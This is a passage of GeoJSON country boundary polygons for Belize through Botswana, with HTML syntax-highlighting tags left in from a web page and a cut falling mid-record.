{"<span class="hljs-selector-tag">type</span>":"<span class="hljs-selector-tag">Feature</span>","<span class="hljs-selector-tag">id</span>":"<span class="hljs-selector-tag">BLZ</span>","<span class="hljs-selector-tag">properties</span>":{"<span class="hljs-selector-tag">name</span>":"<span class="hljs-selector-tag">Belize</span>"},"<span class="hljs-selector-tag">geometry</span>":{"<span class="hljs-selector-tag">type</span>":"<span class="hljs-selector-tag">Polygon</span>","<span class="hljs-selector-tag">coordinates</span>":<span class="hljs-selector-attr">[[[-89.14308,17.808319]</span>,<span class="hljs-selector-attr">[-89.150909,17.955468]</span>,<span class="hljs-selector-attr">[-89.029857,18.001511]</span>,<span class="hljs-selector-attr">[-88.848344,17.883198]</span>,<span class="hljs-selector-attr">[-88.490123,18.486831]</span>,<span class="hljs-selector-attr">[-88.300031,18.499982]</span>,<span class="hljs-selector-attr">[-88.296336,18.353273]</span>,<span class="hljs-selector-attr">[-88.106813,18.348674]</span>,<span class="hljs-selector-attr">[-88.123479,18.076675]</span>,<span class="hljs-selector-attr">[-88.285355,17.644143]</span>,<span class="hljs-selector-attr">[-88.197867,17.489475]</span>,<span class="hljs-selector-attr">[-88.302641,17.131694]</span>,<span class="hljs-selector-attr">[-88.239518,17.036066]</span>,<span class="hljs-selector-attr">[-88.355428,16.530774]</span>,<span class="hljs-selector-attr">[-88.551825,16.265467]</span>,<span class="hljs-selector-attr">[-88.732434,16.233635]</span>,<span class="hljs-selector-attr">[-88.930613,15.887273]</span>,<span class="hljs-selector-attr">[-89.229122,15.886938]</span>,<span class="hljs-selector-attr">[-89.150806,17.015577]</span>,<span class="hljs-selector-attr">[-89.14308,17.808319]</span>]]}},
{"<span class="hljs-selector-tag">type</span>":"<span class="hljs-selector-tag">Feature</span>","<span class="hljs-selector-tag">id</span>":"<span class="hljs-selector-tag">BMU</span>","<span class="hljs-selector-tag">properties</span>":{"<span class="hljs-selector-tag">name</span>":"<span class="hljs-selector-tag">Bermuda</span>"},"<span class="hljs-selector-tag">geometry</span>":{"<span class="hljs-selector-tag">type</span>":"<span class="hljs-selector-tag">Polygon</span>","<span class="hljs-selector-tag">coordinates</span>":<span class="hljs-selector-attr">[[[-64.7799734332998,32.3072000581802]</span>,<span class="hljs-selector-attr">[-64.7873319183061,32.3039237143428]</span>,<span class="hljs-selector-attr">[-64.7946942710173,32.3032682700388]</span>,<span class="hljs-selector-attr">[-64.8094297981283,32.3098175728414]</span>,<span class="hljs-selector-attr">[-64.8167896352437,32.3058845718466]</span>,<span class="hljs-selector-attr">[-64.8101968029642,32.3022833180511]</span>,<span class="hljs-selector-attr">[-64.7962291465484,32.2934409732427]</span>,<span class="hljs-selector-attr">[-64.7815086336978,32.2868973114514]</span>,<span class="hljs-selector-attr">[-64.7997025513437,32.2796896417328]</span>,<span class="hljs-selector-attr">[-64.8066707691087,32.2747767569465]</span>,<span class="hljs-selector-attr">[-64.8225587873683,32.2669111289395]</span>,<span class="hljs-selector-attr">[-64.8287548840306,32.2669075473817]</span>,<span class="hljs-selector-attr">[-64.8306732143498,32.2583944840235]</span>,<span class="hljs-selector-attr">[-64.8399924854972,32.254782282336]</span>,<span class="hljs-selector-attr">[-64.8566090462354,32.2547740387514]</span>,<span class="hljs-selector-attr">[-64.8682296789446,32.2616393614322]</span>,<span class="hljs-selector-attr">[-64.8628241459563,32.2724481933959]</span>,<span class="hljs-selector-attr">[-64.8748651338951,32.2757120264753]</span>,<span class="hljs-selector-attr">[-64.8717752856644,32.2819371582026]</span>,<span class="hljs-selector-attr">[-64.8671422127295,32.2930760547989]</span>,<span class="hljs-selector-attr">[-64.8559068764437,32.2960321186471]</span>,<span class="hljs-selector-attr">[-64.8597429072279,32.3015842021933]</span>,<span class="hljs-selector-attr">[-64.8439233486717,32.3140553852543]</span>,<span class="hljs-selector-attr">[-64.8350242329311,32.3242161760006]</span>,<span class="hljs-selector-attr">[-64.8338690593672,32.3294587561557]</span>,<span class="hljs-selector-attr">[-64.8520298651164,32.3110911879954]</span>,<span class="hljs-selector-attr">[-64.8635922932573,32.3048469433363]</span>,<span class="hljs-selector-attr">[-64.8686668994079,32.30910745083]</span>,<span class="hljs-selector-attr">[-64.8721354593415,32.3041908606301]</span>,<span class="hljs-selector-attr">[-64.8779667328485,32.3038632800462]</span>,<span class="hljs-selector-attr">[-64.8780046844321,32.2907757831692]</span>,<span class="hljs-selector-attr">[-64.8849776658292,32.2819261366004]</span>,<span class="hljs-selector-attr">[-64.8783230004629,32.2613001418681]</span>,<span class="hljs-selector-attr">[-64.863194968877,32.2465799485801]</span>,<span class="hljs-selector-attr">[-64.8519819555722,32.2485519134663]</span>,<span class="hljs-selector-attr">[-64.842311980074,32.2492123317296]</span>,<span class="hljs-selector-attr">[-64.8388242605209,32.2475773472534]</span>,<span class="hljs-selector-attr">[-64.8334002575532,32.2462714714698]</span>,<span class="hljs-selector-attr">[-64.8256389530584,32.2472637398594]</span>,<span class="hljs-selector-attr">[-64.8205697556026,32.2531698880328]</span>,<span class="hljs-selector-attr">[-64.8105087275579,32.2561208974156]</span>,<span class="hljs-selector-attr">[-64.7900177727338,32.2659446936992]</span>,<span class="hljs-selector-attr">[-64.7745415970416,32.2718413023427]</span>,<span class="hljs-selector-attr">[-64.7644742436426,32.2855931353214]</span>,<span class="hljs-selector-attr">[-64.7551803442276,32.2908326702531]</span>,<span class="hljs-selector-attr">[-64.7423982971436,32.2996734994024]</span>,<span class="hljs-selector-attr">[-64.7206991797682,32.3137542201258]</span>,<span class="hljs-selector-attr">[-64.7117851247134,32.3176823360806]</span>,<span class="hljs-selector-attr">[-64.6962778813133,32.3275029115532]</span>,<span class="hljs-selector-attr">[-64.6768921127452,32.3324095397555]</span>,<span class="hljs-selector-attr">[-64.6567136927777,32.3451776458469]</span>,<span class="hljs-selector-attr">[-64.6532168823499,32.3494356627941]</span>,<span class="hljs-selector-attr">[-64.6605720384429,32.3589423487763]</span>,<span class="hljs-selector-attr">[-64.65125819471,32.3615600906466]</span>,<span class="hljs-selector-attr">[-64.6462011670816,32.36975169749]</span>,<span class="hljs-selector-attr">[-64.6613227512832,32.3763135008721]</span>,<span class="hljs-selector-attr">[-64.6690666074397,32.388444543924]</span>,<span class="hljs-selector-attr">[-64.6834270548595,32.3854968316788]</span>,<span class="hljs-selector-attr">[-64.6954617672714,32.3763221285869]</span>,<span class="hljs-selector-attr">[-64.70438689565,32.3704254760469]</span>,<span class="hljs-selector-attr">[-64.7117569982798,32.368132600249]</span>,<span class="hljs-selector-attr">[-64.7061764744404,32.3600110593559]</span>,<span class="hljs-selector-attr">[-64.700531552697,32.3590601356818]</span>,<span class="hljs-selector-attr">[-64.6940348033967,32.3640708659835]</span>,<span class="hljs-selector-attr">[-64.6895164826082,32.3633598579866]</span>,<span class="hljs-selector-attr">[-64.6864150099255,32.3547797587266]</span>,<span class="hljs-selector-attr">[-64.6824635995504,32.3540628176846]</span>,<span class="hljs-selector-attr">[-64.6835876652835,32.3626447677968]</span>,<span class="hljs-selector-attr">[-64.6801998697415,32.3631199096979]</span>,<span class="hljs-selector-attr">[-64.6672170444687,32.3597751617473]</span>,<span class="hljs-selector-attr">[-64.6598811264978,32.3497625771755]</span>,<span class="hljs-selector-attr">[-64.6737331235384,32.3390281851635]</span>,<span class="hljs-selector-attr">[-64.6887090648183,32.3342439408053]</span>,<span class="hljs-selector-attr">[-64.706732854446,32.3429010723036]</span>,<span class="hljs-selector-attr">[-64.7149301576112,32.3552188753513]</span>,<span class="hljs-selector-attr">[-64.7185967666669,32.3552239212394]</span>,<span class="hljs-selector-attr">[-64.7214189847314,32.3518830231342]</span>,<span class="hljs-selector-attr">[-64.7270616067222,32.3466461715475]</span>,<span class="hljs-selector-attr">[-64.734962460882,32.3442819830499]</span>,<span class="hljs-selector-attr">[-64.7383521549094,32.3407216514918]</span>,<span class="hljs-selector-attr">[-64.7411729976333,32.3311790864627]</span>,<span class="hljs-selector-attr">[-64.7423019216485,32.323311561213]</span>,<span class="hljs-selector-attr">[-64.7462482354281,32.318538611581]</span>,<span class="hljs-selector-attr">[-64.7566773739613,32.3130509130175]</span>,<span class="hljs-selector-attr">[-64.768738200563,32.3088369816572]</span>,<span class="hljs-selector-attr">[-64.7799734332998,32.3072000581802]</span>]]}},
{"<span class="hljs-selector-tag">type</span>":"<span class="hljs-selector-tag">Feature</span>","<span class="hljs-selector-tag">id</span>":"<span class="hljs-selector-tag">BOL</span>","<span class="hljs-selector-tag">properties</span>":{"<span class="hljs-selector-tag">name</span>":"<span class="hljs-selector-tag">Bolivia</span>"},"<span class="hljs-selector-tag">geometry</span>":{"<span class="hljs-selector-tag">type</span>":"<span class="hljs-selector-tag">Polygon</span>","<span class="hljs-selector-tag">coordinates</span>":<span class="hljs-selector-attr">[[[-62.846468,-22.034985]</span>,<span class="hljs-selector-attr">[-63.986838,-21.993644]</span>,<span class="hljs-selector-attr">[-64.377021,-22.798091]</span>,<span class="hljs-selector-attr">[-64.964892,-22.075862]</span>,<span class="hljs-selector-attr">[-66.273339,-21.83231]</span>,<span class="hljs-selector-attr">[-67.106674,-22.735925]</span>,<span class="hljs-selector-attr">[-67.82818,-22.872919]</span>,<span class="hljs-selector-attr">[-68.219913,-21.494347]</span>,<span class="hljs-selector-attr">[-68.757167,-20.372658]</span>,<span class="hljs-selector-attr">[-68.442225,-19.405068]</span>,<span class="hljs-selector-attr">[-68.966818,-18.981683]</span>,<span class="hljs-selector-attr">[-69.100247,-18.260125]</span>,<span class="hljs-selector-attr">[-69.590424,-17.580012]</span>,<span class="hljs-selector-attr">[-68.959635,-16.500698]</span>,<span class="hljs-selector-attr">[-69.389764,-15.660129]</span>,<span class="hljs-selector-attr">[-69.160347,-15.323974]</span>,<span class="hljs-selector-attr">[-69.339535,-14.953195]</span>,<span class="hljs-selector-attr">[-68.948887,-14.453639]</span>,<span class="hljs-selector-attr">[-68.929224,-13.602684]</span>,<span class="hljs-selector-attr">[-68.88008,-12.899729]</span>,<span class="hljs-selector-attr">[-68.66508,-12.5613]</span>,<span class="hljs-selector-attr">[-69.529678,-10.951734]</span>,<span class="hljs-selector-attr">[-68.786158,-11.03638]</span>,<span class="hljs-selector-attr">[-68.271254,-11.014521]</span>,<span class="hljs-selector-attr">[-68.048192,-10.712059]</span>,<span class="hljs-selector-attr">[-67.173801,-10.306812]</span>,<span class="hljs-selector-attr">[-66.646908,-9.931331]</span>,<span class="hljs-selector-attr">[-65.338435,-9.761988]</span>,<span class="hljs-selector-attr">[-65.444837,-10.511451]</span>,<span class="hljs-selector-attr">[-65.321899,-10.895872]</span>,<span class="hljs-selector-attr">[-65.402281,-11.56627]</span>,<span class="hljs-selector-attr">[-64.316353,-12.461978]</span>,<span class="hljs-selector-attr">[-63.196499,-12.627033]</span>,<span class="hljs-selector-attr">[-62.80306,-13.000653]</span>,<span class="hljs-selector-attr">[-62.127081,-13.198781]</span>,<span class="hljs-selector-attr">[-61.713204,-13.489202]</span>,<span class="hljs-selector-attr">[-61.084121,-13.479384]</span>,<span class="hljs-selector-attr">[-60.503304,-13.775955]</span>,<span class="hljs-selector-attr">[-60.459198,-14.354007]</span>,<span class="hljs-selector-attr">[-60.264326,-14.645979]</span>,<span class="hljs-selector-attr">[-60.251149,-15.077219]</span>,<span class="hljs-selector-attr">[-60.542966,-15.09391]</span>,<span class="hljs-selector-attr">[-60.15839,-16.258284]</span>,<span class="hljs-selector-attr">[-58.24122,-16.299573]</span>,<span class="hljs-selector-attr">[-58.388058,-16.877109]</span>,<span class="hljs-selector-attr">[-58.280804,-17.27171]</span>,<span class="hljs-selector-attr">[-57.734558,-17.552468]</span>,<span class="hljs-selector-attr">[-57.498371,-18.174188]</span>,<span class="hljs-selector-attr">[-57.676009,-18.96184]</span>,<span class="hljs-selector-attr">[-57.949997,-19.400004]</span>,<span class="hljs-selector-attr">[-57.853802,-19.969995]</span>,<span class="hljs-selector-attr">[-58.166392,-20.176701]</span>,<span class="hljs-selector-attr">[-58.183471,-19.868399]</span>,<span class="hljs-selector-attr">[-59.115042,-19.356906]</span>,<span class="hljs-selector-attr">[-60.043565,-19.342747]</span>,<span class="hljs-selector-attr">[-61.786326,-19.633737]</span>,<span class="hljs-selector-attr">[-62.265961,-20.513735]</span>,<span class="hljs-selector-attr">[-62.291179,-21.051635]</span>,<span class="hljs-selector-attr">[-62.685057,-22.249029]</span>,<span class="hljs-selector-attr">[-62.846468,-22.034985]</span>]]}},
{"<span class="hljs-selector-tag">type</span>":"<span class="hljs-selector-tag">Feature</span>","<span class="hljs-selector-tag">id</span>":"<span class="hljs-selector-tag">BRA</span>","<span class="hljs-selector-tag">properties</span>":{"<span class="hljs-selector-tag">name</span>":"<span class="hljs-selector-tag">Brazil</span>"},"<span class="hljs-selector-tag">geometry</span>":{"<span class="hljs-selector-tag">type</span>":"<span class="hljs-selector-tag">Polygon</span>","<span class="hljs-selector-tag">coordinates</span>":<span class="hljs-selector-attr">[[[-57.625133,-30.216295]</span>,<span class="hljs-selector-attr">[-56.2909,-28.852761]</span>,<span class="hljs-selector-attr">[-55.162286,-27.881915]</span>,<span class="hljs-selector-attr">[-54.490725,-27.474757]</span>,<span class="hljs-selector-attr">[-53.648735,-26.923473]</span>,<span class="hljs-selector-attr">[-53.628349,-26.124865]</span>,<span class="hljs-selector-attr">[-54.13005,-25.547639]</span>,<span class="hljs-selector-attr">[-54.625291,-25.739255]</span>,<span class="hljs-selector-attr">[-54.428946,-25.162185]</span>,<span class="hljs-selector-attr">[-54.293476,-24.5708]</span>,<span class="hljs-selector-attr">[-54.29296,-24.021014]</span>,<span class="hljs-selector-attr">[-54.652834,-23.839578]</span>,<span class="hljs-selector-attr">[-55.027902,-24.001274]</span>,<span class="hljs-selector-attr">[-55.400747,-23.956935]</span>,<span class="hljs-selector-attr">[-55.517639,-23.571998]</span>,<span class="hljs-selector-attr">[-55.610683,-22.655619]</span>,<span class="hljs-selector-attr">[-55.797958,-22.35693]</span>,<span class="hljs-selector-attr">[-56.473317,-22.0863]</span>,<span class="hljs-selector-attr">[-56.88151,-22.282154]</span>,<span class="hljs-selector-attr">[-57.937156,-22.090176]</span>,<span class="hljs-selector-attr">[-57.870674,-20.732688]</span>,<span class="hljs-selector-attr">[-58.166392,-20.176701]</span>,<span class="hljs-selector-attr">[-57.853802,-19.969995]</span>,<span class="hljs-selector-attr">[-57.949997,-19.400004]</span>,<span class="hljs-selector-attr">[-57.676009,-18.96184]</span>,<span class="hljs-selector-attr">[-57.498371,-18.174188]</span>,<span class="hljs-selector-attr">[-57.734558,-17.552468]</span>,<span class="hljs-selector-attr">[-58.280804,-17.27171]</span>,<span class="hljs-selector-attr">[-58.388058,-16.877109]</span>,<span class="hljs-selector-attr">[-58.24122,-16.299573]</span>,<span class="hljs-selector-attr">[-60.15839,-16.258284]</span>,<span class="hljs-selector-attr">[-60.542966,-15.09391]</span>,<span class="hljs-selector-attr">[-60.251149,-15.077219]</span>,<span class="hljs-selector-attr">[-60.264326,-14.645979]</span>,<span class="hljs-selector-attr">[-60.459198,-14.354007]</span>,<span class="hljs-selector-attr">[-60.503304,-13.775955]</span>,<span class="hljs-selector-attr">[-61.084121,-13.479384]</span>,<span class="hljs-selector-attr">[-61.713204,-13.489202]</span>,<span class="hljs-selector-attr">[-62.127081,-13.198781]</span>,<span class="hljs-selector-attr">[-62.80306,-13.000653]</span>,<span class="hljs-selector-attr">[-63.196499,-12.627033]</span>,<span class="hljs-selector-attr">[-64.316353,-12.461978]</span>,<span class="hljs-selector-attr">[-65.402281,-11.56627]</span>,<span class="hljs-selector-attr">[-65.321899,-10.895872]</span>,<span class="hljs-selector-attr">[-65.444837,-10.511451]</span>,<span class="hljs-selector-attr">[-65.338435,-9.761988]</span>,<span class="hljs-selector-attr">[-66.646908,-9.931331]</span>,<span class="hljs-selector-attr">[-67.173801,-10.306812]</span>,<span class="hljs-selector-attr">[-68.048192,-10.712059]</span>,<span class="hljs-selector-attr">[-68.271254,-11.014521]</span>,<span class="hljs-selector-attr">[-68.786158,-11.03638]</span>,<span class="hljs-selector-attr">[-69.529678,-10.951734]</span>,<span class="hljs-selector-attr">[-70.093752,-11.123972]</span>,<span class="hljs-selector-attr">[-70.548686,-11.009147]</span>,<span class="hljs-selector-attr">[-70.481894,-9.490118]</span>,<span class="hljs-selector-attr">[-71.302412,-10.079436]</span>,<span class="hljs-selector-attr">[-72.184891,-10.053598]</span>,<span class="hljs-selector-attr">[-72.563033,-9.520194]</span>,<span class="hljs-selector-attr">[-73.226713,-9.462213]</span>,<span class="hljs-selector-attr">[-73.015383,-9.032833]</span>,<span class="hljs-selector-attr">[-73.571059,-8.424447]</span>,<span class="hljs-selector-attr">[-73.987235,-7.52383]</span>,<span class="hljs-selector-attr">[-73.723401,-7.340999]</span>,<span class="hljs-selector-attr">[-73.724487,-6.918595]</span>,<span class="hljs-selector-attr">[-73.120027,-6.629931]</span>,<span class="hljs-selector-attr">[-73.219711,-6.089189]</span>,<span class="hljs-selector-attr">[-72.964507,-5.741251]</span>,<span class="hljs-selector-attr">[-72.891928,-5.274561]</span>,<span class="hljs-selector-attr">[-71.748406,-4.593983]</span>,<span class="hljs-selector-attr">[-70.928843,-4.401591]</span>,<span class="hljs-selector-attr">[-70.794769,-4.251265]</span>,<span class="hljs-selector-attr">[-69.893635,-4.298187]</span>,<span class="hljs-selector-attr">[-69.444102,-1.556287]</span>,<span class="hljs-selector-attr">[-69.420486,-1.122619]</span>,<span class="hljs-selector-attr">[-69.577065,-0.549992]</span>,<span class="hljs-selector-attr">[-70.020656,-0.185156]</span>,<span class="hljs-selector-attr">[-70.015566,0.541414]</span>,<span class="hljs-selector-attr">[-69.452396,0.706159]</span>,<span class="hljs-selector-attr">[-69.252434,0.602651]</span>,<span class="hljs-selector-attr">[-69.218638,0.985677]</span>,<span class="hljs-selector-attr">[-69.804597,1.089081]</span>,<span class="hljs-selector-attr">[-69.816973,1.714805]</span>,<span class="hljs-selector-attr">[-67.868565,1.692455]</span>,<span class="hljs-selector-attr">[-67.53781,2.037163]</span>,<span class="hljs-selector-attr">[-67.259998,1.719999]</span>,<span class="hljs-selector-attr">[-67.065048,1.130112]</span>,<span class="hljs-selector-attr">[-66.876326,1.253361]</span>,<span class="hljs-selector-attr">[-66.325765,0.724452]</span>,<span class="hljs-selector-attr">[-65.548267,0.789254]</span>,<span class="hljs-selector-attr">[-65.354713,1.095282]</span>,<span class="hljs-selector-attr">[-64.611012,1.328731]</span>,<span class="hljs-selector-attr">[-64.199306,1.492855]</span>,<span class="hljs-selector-attr">[-64.083085,1.916369]</span>,<span class="hljs-selector-attr">[-63.368788,2.2009]</span>,<span class="hljs-selector-attr">[-63.422867,2.411068]</span>,<span class="hljs-selector-attr">[-64.269999,2.497006]</span>,<span class="hljs-selector-attr">[-64.408828,3.126786]</span>,<span class="hljs-selector-attr">[-64.368494,3.79721]</span>,<span class="hljs-selector-attr">[-64.816064,4.056445]</span>,<span class="hljs-selector-attr">[-64.628659,4.148481]</span>,<span class="hljs-selector-attr">[-63.888343,4.02053]</span>,<span class="hljs-selector-attr">[-63.093198,3.770571]</span>,<span class="hljs-selector-attr">[-62.804533,4.006965]</span>,<span class="hljs-selector-attr">[-62.08543,4.162124]</span>,<span class="hljs-selector-attr">[-60.966893,4.536468]</span>,<span class="hljs-selector-attr">[-60.601179,4.918098]</span>,<span class="hljs-selector-attr">[-60.733574,5.200277]</span>,<span class="hljs-selector-attr">[-60.213683,5.244486]</span>,<span class="hljs-selector-attr">[-59.980959,5.014061]</span>,<span class="hljs-selector-attr">[-60.111002,4.574967]</span>,<span class="hljs-selector-attr">[-59.767406,4.423503]</span>,<span class="hljs-selector-attr">[-59.53804,3.958803]</span>,<span class="hljs-selector-attr">[-59.815413,3.606499]</span>,<span class="hljs-selector-attr">[-59.974525,2.755233]</span>,<span class="hljs-selector-attr">[-59.718546,2.24963]</span>,<span class="hljs-selector-attr">[-59.646044,1.786894]</span>,<span class="hljs-selector-attr">[-59.030862,1.317698]</span>,<span class="hljs-selector-attr">[-58.540013,1.268088]</span>,<span class="hljs-selector-attr">[-58.429477,1.463942]</span>,<span class="hljs-selector-attr">[-58.11345,1.507195]</span>,<span class="hljs-selector-attr">[-57.660971,1.682585]</span>,<span class="hljs-selector-attr">[-57.335823,1.948538]</span>,<span class="hljs-selector-attr">[-56.782704,1.863711]</span>,<span class="hljs-selector-attr">[-56.539386,1.899523]</span>,<span class="hljs-selector-attr">[-55.995698,1.817667]</span>,<span class="hljs-selector-attr">[-55.9056,2.021996]</span>,<span class="hljs-selector-attr">[-56.073342,2.220795]</span>,<span class="hljs-selector-attr">[-55.973322,2.510364]</span>,<span class="hljs-selector-attr">[-55.569755,2.421506]</span>,<span class="hljs-selector-attr">[-55.097587,2.523748]</span>,<span class="hljs-selector-attr">[-54.524754,2.311849]</span>,<span class="hljs-selector-attr">[-54.088063,2.105557]</span>,<span class="hljs-selector-attr">[-53.778521,2.376703]</span>,<span class="hljs-selector-attr">[-53.554839,2.334897]</span>,<span class="hljs-selector-attr">[-53.418465,2.053389]</span>,<span class="hljs-selector-attr">[-52.939657,2.124858]</span>,<span class="hljs-selector-attr">[-52.556425,2.504705]</span>,<span class="hljs-selector-attr">[-52.249338,3.241094]</span>,<span class="hljs-selector-attr">[-51.657797,4.156232]</span>,<span class="hljs-selector-attr">[-51.317146,4.203491]</span>,<span class="hljs-selector-attr">[-51.069771,3.650398]</span>,<span class="hljs-selector-attr">[-50.508875,1.901564]</span>,<span class="hljs-selector-attr">[-49.974076,1.736483]</span>,<span class="hljs-selector-attr">[-49.947101,1.04619]</span>,<span class="hljs-selector-attr">[-50.699251,0.222984]</span>,<span class="hljs-selector-attr">[-50.388211,-0.078445]</span>,<span class="hljs-selector-attr">[-48.620567,-0.235489]</span>,<span class="hljs-selector-attr">[-48.584497,-1.237805]</span>,<span class="hljs-selector-attr">[-47.824956,-0.581618]</span>,<span class="hljs-selector-attr">[-46.566584,-0.941028]</span>,<span class="hljs-selector-attr">[-44.905703,-1.55174]</span>,<span class="hljs-selector-attr">[-44.417619,-2.13775]</span>,<span class="hljs-selector-attr">[-44.581589,-2.691308]</span>,<span class="hljs-selector-attr">[-43.418791,-2.38311]</span>,<span class="hljs-selector-attr">[-41.472657,-2.912018]</span>,<span class="hljs-selector-attr">[-39.978665,-2.873054]</span>,<span class="hljs-selector-attr">[-38.500383,-3.700652]</span>,<span class="hljs-selector-attr">[-37.223252,-4.820946]</span>,<span class="hljs-selector-attr">[-36.452937,-5.109404]</span>,<span class="hljs-selector-attr">[-35.597796,-5.149504]</span>,<span class="hljs-selector-attr">[-35.235389,-5.464937]</span>,<span class="hljs-selector-attr">[-34.89603,-6.738193]</span>,<span class="hljs-selector-attr">[-34.729993,-7.343221]</span>,<span class="hljs-selector-attr">[-35.128212,-8.996401]</span>,<span class="hljs-selector-attr">[-35.636967,-9.649282]</span>,<span class="hljs-selector-attr">[-37.046519,-11.040721]</span>,<span class="hljs-selector-attr">[-37.683612,-12.171195]</span>,<span class="hljs-selector-attr">[-38.423877,-13.038119]</span>,<span class="hljs-selector-attr">[-38.673887,-13.057652]</span>,<span class="hljs-selector-attr">[-38.953276,-13.79337]</span>,<span class="hljs-selector-attr">[-38.882298,-15.667054]</span>,<span class="hljs-selector-attr">[-39.161092,-17.208407]</span>,<span class="hljs-selector-attr">[-39.267339,-17.867746]</span>,<span class="hljs-selector-attr">[-39.583521,-18.262296]</span>,<span class="hljs-selector-attr">[-39.760823,-19.599113]</span>,<span class="hljs-selector-attr">[-40.774741,-20.904512]</span>,<span class="hljs-selector-attr">[-40.944756,-21.937317]</span>,<span class="hljs-selector-attr">[-41.754164,-22.370676]</span>,<span class="hljs-selector-attr">[-41.988284,-22.97007]</span>,<span class="hljs-selector-attr">[-43.074704,-22.967693]</span>,<span class="hljs-selector-attr">[-44.647812,-23.351959]</span>,<span class="hljs-selector-attr">[-45.352136,-23.796842]</span>,<span class="hljs-selector-attr">[-46.472093,-24.088969]</span>,<span class="hljs-selector-attr">[-47.648972,-24.885199]</span>,<span class="hljs-selector-attr">[-48.495458,-25.877025]</span>,<span class="hljs-selector-attr">[-48.641005,-26.623698]</span>,<span class="hljs-selector-attr">[-48.474736,-27.175912]</span>,<span class="hljs-selector-attr">[-48.66152,-28.186135]</span>,<span class="hljs-selector-attr">[-48.888457,-28.674115]</span>,<span class="hljs-selector-attr">[-49.587329,-29.224469]</span>,<span class="hljs-selector-attr">[-50.696874,-30.984465]</span>,<span class="hljs-selector-attr">[-51.576226,-31.777698]</span>,<span class="hljs-selector-attr">[-52.256081,-32.24537]</span>,<span class="hljs-selector-attr">[-52.7121,-33.196578]</span>,<span class="hljs-selector-attr">[-53.373662,-33.768378]</span>,<span class="hljs-selector-attr">[-53.650544,-33.202004]</span>,<span class="hljs-selector-attr">[-53.209589,-32.727666]</span>,<span class="hljs-selector-attr">[-53.787952,-32.047243]</span>,<span class="hljs-selector-attr">[-54.572452,-31.494511]</span>,<span class="hljs-selector-attr">[-55.60151,-30.853879]</span>,<span class="hljs-selector-attr">[-55.973245,-30.883076]</span>,<span class="hljs-selector-attr">[-56.976026,-30.109686]</span>,<span class="hljs-selector-attr">[-57.625133,-30.216295]</span>]]}},
{"<span class="hljs-selector-tag">type</span>":"<span class="hljs-selector-tag">Feature</span>","<span class="hljs-selector-tag">id</span>":"<span class="hljs-selector-tag">BRN</span>","<span class="hljs-selector-tag">properties</span>":{"<span class="hljs-selector-tag">name</span>":"<span class="hljs-selector-tag">Brunei</span>"},"<span class="hljs-selector-tag">geometry</span>":{"<span class="hljs-selector-tag">type</span>":"<span class="hljs-selector-tag">Polygon</span>","<span class="hljs-selector-tag">coordinates</span>":<span class="hljs-selector-attr">[[[114.204017,4.525874]</span>,<span class="hljs-selector-attr">[114.599961,4.900011]</span>,<span class="hljs-selector-attr">[115.45071,5.44773]</span>,<span class="hljs-selector-attr">[115.4057,4.955228]</span>,<span class="hljs-selector-attr">[115.347461,4.316636]</span>,<span class="hljs-selector-attr">[114.869557,4.348314]</span>,<span class="hljs-selector-attr">[114.659596,4.007637]</span>,<span class="hljs-selector-attr">[114.204017,4.525874]</span>]]}},
{"<span class="hljs-selector-tag">type</span>":"<span class="hljs-selector-tag">Feature</span>","<span class="hljs-selector-tag">id</span>":"<span class="hljs-selector-tag">BTN</span>","<span class="hljs-selector-tag">properties</span>":{"<span class="hljs-selector-tag">name</span>":"<span class="hljs-selector-tag">Bhutan</span>"},"<span class="hljs-selector-tag">geometry</span>":{"<span class="hljs-selector-tag">type</span>":"<span class="hljs-selector-tag">Polygon</span>","<span class="hljs-selector-tag">coordinates</span>":<span class="hljs-selector-attr">[[[91.696657,27.771742]</span>,<span class="hljs-selector-attr">[92.103712,27.452614]</span>,<span class="hljs-selector-attr">[92.033484,26.83831]</span>,<span class="hljs-selector-attr">[91.217513,26.808648]</span>,<span class="hljs-selector-attr">[90.373275,26.875724]</span>,<span class="hljs-selector-attr">[89.744528,26.719403]</span>,<span class="hljs-selector-attr">[88.835643,27.098966]</span>,<span class="hljs-selector-attr">[88.814248,27.299316]</span>,<span class="hljs-selector-attr">[89.47581,28.042759]</span>,<span class="hljs-selector-attr">[90.015829,28.296439]</span>,<span class="hljs-selector-attr">[90.730514,28.064954]</span>,<span class="hljs-selector-attr">[91.258854,28.040614]</span>,<span class="hljs-selector-attr">[91.696657,27.771742]</span>]]}},
{"<span class="hljs-selector-tag">type</span>":"<span class="hljs-selector-tag">Feature</span>","<span class="hljs-selector-tag">id</span>":"<span class="hljs-selector-tag">BWA</span>","<span class="hljs-selector-tag">properties</span>":{"<span class="hljs-selector-tag">name</span>":"<span class="hljs-selector-tag">Botswana</span>"},"<span class="hljs-selector-tag">geometry</span>":{"<span class="hljs-selector-tag">type</span>":"<span class="hljs-selector-tag">Polygon</span>","<span class="hljs-selector-tag">coordinates</span>":<span class="hljs-selector-attr">[[[25.649163,-18.536026]</span>,<span class="hljs-selector-attr">[25.850391,-18.714413]</span>,<span class="hljs-selector-attr">[26.164791,-19.293086]</span>,<span class="hljs-selector-attr">[27.296505,-20.39152]</span>,<span class="hljs-selector-attr">[27.724747,-20.499059]</span>,<span class="hljs-selector-attr">[27.727228,-20.851802]</span>,<span class="hljs-selector-attr">[28.02137,-21.485975]</span>,<span class="hljs-selector-attr">[28.794656,-21.639454]</span>,<span class="hljs-selector-attr">[29.432188,-22.091313]</span>,<span class="hljs-selector-attr">[28.017236,-22.827754]</span>,<span class="hljs-selector-attr">[27.11941,-23.574323]</span>,<span class="hljs-selector-attr">[26.786407,-24.240691]</span>,<span class="hljs-selector-attr">[26.485753,-24.616327]</span>,<span class="hljs-selector-attr">[25.941652,-24.696373]</span>,<span class="hljs-selector-attr">[25.765849,-25.174845]</span>,<span class="hljs-selector-attr">[25.664666,-25.486816]</span>,<span class="hljs-selector-attr">[25.025171,-25.71967]</span>,<span class="hljs-selector-attr">[24.211267,-25.670216]</span>,<span class="hljs-selector-attr">[23.73357,-25.390129]</span>,<span class="hljs-selector-attr">[23.312097,-25.26869]</span>,<span class="hljs-selector-attr">[22.824271,-25.500459]</span>,<span class="hljs-selector-attr">[22.579532,-25.979448]</span>,<span class="hljs-selector-attr">[22.105969,-26.280256]</span>,<span class="hljs-selector-attr">[21.605896,-26.726534]</span>,<span class="hljs-selector-attr">[20.889609,-26.828543]</span>,<span class="hljs-selector-attr">[20.66647,-26.477453]</span>,<span class="hljs-selector-attr">[20.758609,-25.868136]</span>,<span class="hljs-selector-attr">[20.165726,-24.917962]</span>,<span class="hljs-selector-attr">[19.895768,-24.76779]</span>,<span class="hljs-selector-attr">[19.895458,-21.849157]</span>,<span 